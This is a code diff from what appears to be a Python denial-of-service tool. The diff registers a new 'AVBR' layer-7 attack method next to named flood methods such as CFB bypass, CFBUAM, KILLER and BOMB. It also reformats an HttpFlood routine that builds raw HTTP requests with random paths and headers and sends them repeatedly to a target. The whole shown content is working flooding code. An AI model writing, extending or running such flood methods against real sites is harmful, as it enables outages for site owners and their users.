@@ -80,7 +80,7 @@ def exit(*message):
 class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
-        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM","CFBUAMR",
+        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB","AVBR", "CFBUAM","CFBUAMR",
         "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
     }
 
@@ -938,9 +938,7 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
   def AVBR(self):
-        payload = str.encode("%s %ss=%s HTTP/1.1\r\n" % (self._req_type,
-                                                           self._target.raw_path_qs,
-                                                           ProxyTools.Random.rand_str(6)) +
+        payload = str.encode("%s %ss=%s HTTP/1.1\r\n" % (self._req_type,self._target.raw_path_qs,ProxyTools.Random.rand_str(6)) +
                              "Host: %s\r\n" % self._target.authority +
                              self.randHeadercontent +
                              'Accept-Encoding: gzip, deflate, br\r\n'
@@ -960,7 +958,7 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
                 sleep(6)
         Tools.safe_close(s)
-
+        
     def DGB(self):
         global REQUESTS_SENT, BYTES_SEND
         with suppress(Exception):
